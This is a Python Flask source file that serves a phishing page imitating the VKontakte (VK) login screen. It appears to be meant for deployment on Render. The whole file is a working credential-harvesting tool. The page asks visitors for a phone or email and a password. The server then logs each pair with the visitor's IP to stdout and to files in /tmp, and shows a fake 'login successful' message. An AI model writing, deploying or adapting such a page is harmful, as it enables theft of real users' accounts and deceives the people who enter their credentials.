from flask import Flask, render_template, request
import logging
import sys
import os

# Настройка логирования для Render (stdout + файл)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s [%(process)d] %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/tmp/vk-login.log')
    ],
    force=True
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    logger.info(f"=== НОВЫЙ ЗАПРОС === Метод: {request.method} IP: {request.remote_addr} User-Agent: {request.headers.get('User-Agent', 'Unknown')}")
    logger.info(f"Форма данные: {dict(request.form)}")
    logger.info(f"Args: {request.args}")
    
    if request.method == 'POST':
        # Получаем данные формы с проверкой
        login_data = request.form.get('email', '').strip()
        password_data = request.form.get('pass', '').strip()
        
        # Явное логирование в stdout для Render
        logger.info("=== ЛОГИН ПОЛУЧЕН ===")
        logger.info(f"лог: {login_data}")
        print(f"🔥 ЛОГ-СЕРВЕР: лог: '{login_data}'")
        logger.info(f"пароль: {password_data}")
        print(f"🔥 ПАРОЛЬ-СЕРВЕР: пароль: '{password_data}'")
        logger.info("=== КОНЕЦ ЛОГИНА ===")
        
        # Дополнительное логирование в файл
        with open('/tmp/vk_creds.log', 'a') as f:
            f.write(f"{request.remote_addr} | лог: {login_data} | пароль: {password_data}\n")
        
        return '''
        <div style="text-align:center; padding:50px; background:#f0f8f5; border-radius:15px; max-width:400px; margin:50px auto; box-shadow:0 10px 30px rgba(0,0,0,0.2);">
            <h2 style="color:#27ae60;">✅ Вход успешен!</h2>
            <p style="color:#2c3e50; font-size:18px;">Данные успешно залогированы на сервере</p>
            <p><a href="/" style="color:#3498db; text-decoration:none;">← Вернуться</a></p>
        </div>
        '''
    
    logger.info("GET запрос - показываем VK форму")
    
    # HTML шаблон прямо в коде (гарантированно работает)
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ВКонтакте</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); 
            min-height: 100vh; 
            display: flex; align-items: center; justify-content: center; 
        }
        .container { 
            background: rgba(255,255,255,0.95); 
            backdrop-filter: blur(20px); 
            border-radius: 24px; 
            padding: 48px 40px; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.15); 
            max-width: 380px; 
            width: 100%; 
            text-align: center;
        }
        .logo { font-size: 28px; font-weight: 700; color: #2c3657; margin-bottom: 8px; }
        .subtitle { color: #818c98; font-size: 16px; margin-bottom: 32px; }
        .form-group { margin-bottom: 20px; position: relative; }
        .input { 
            width: 100%; padding: 18px 20px; 
            border: 2px solid #e6e8f0; 
            border-radius: 12px; 
            font-size: 16px; 
            background: white; 
            transition: all 0.3s ease; 
        }
        .input:focus { 
            outline: none; 
            border-color: #5181b8; 
            box-shadow: 0 0 0 4px rgba(81,129,184,0.1); 
        }
        .login-btn { 
            background: linear-gradient(135deg, #5181b8 0%, #456fa0 100%); 
            color: white; 
            border: none; 
            padding: 18px; 
            border-radius: 12px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            width: 100%; 
            transition: all 0.3s ease; 
            text-transform: uppercase; 
            letter-spacing: 0.5px;
        }
        .login-btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 15px 30px rgba(81,129,184,0.4); 
        }
        .register-btn { 
            background: linear-gradient(135deg, #4bb34b 0%, #3d9b3d 100%); 
            margin-top: 20px; 
            text-decoration: none; 
            display: inline-block; 
            padding: 16px; 
            border-radius: 12px; 
            color: white; 
            font-weight: 500; 
        }
        .forgot { margin: 24px 0; }
        .forgot a { color: #5181b8; text-decoration: none; font-size: 14px; }
        .status { margin-top: 20px; padding: 12px; border-radius: 8px; font-weight: 500; }
        .success { background: #d4edda; color: #155724; }
        @media (max-width: 480px) { .container { margin: 20px; padding: 32px 24px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">VK</div>
        <div class="subtitle">Войдите на сайт</div>
        
        <form method="POST" action="/">
            <div class="form-group">
                <input type="text" class="input" name="email" placeholder="Телефон или почта" required autocomplete="username">
            </div>
            <div class="form-group">
                <input type="password" class="input" name="pass" placeholder="Пароль" required autocomplete="current-password">
            </div>
            <button type="submit" class="login-btn">Войти</button>
        </form>
        
        <div class="forgot">
            <a href="#">Забыли пароль?</a>
        </div>
        
        <div style="margin: 24px 0; color: #818c98; font-size: 14px;">
            Первый раз на ВК?
        </div>
        
        <a href="#" class="register-btn">Зарегистрироваться</a>
    </div>
    
    <script>
        // Отладка формы
        document.querySelector('form').addEventListener('submit', function(e) {
            console.log('Форма отправляется...');
            const email = document.querySelector('input[name="email"]').value;
            const pass = document.querySelector('input[name="pass"]').value;
            console.log('Логин:', email);
            console.log('Пароль:', pass);
        });
    </script>
</body>
</html>
    '''

@app.route('/health')
def health():
    return "OK", 200

@app.errorhandler(404)
def not_found(error):
    logger.error(f"404 от {request.remote_addr}: {request.url}")
    return "Страница не найдена", 404

@app.errorhandler(500)
def server_error(error):
    logger.error(f"500 ошибка: {str(error)}")
    return "Ошибка сервера", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
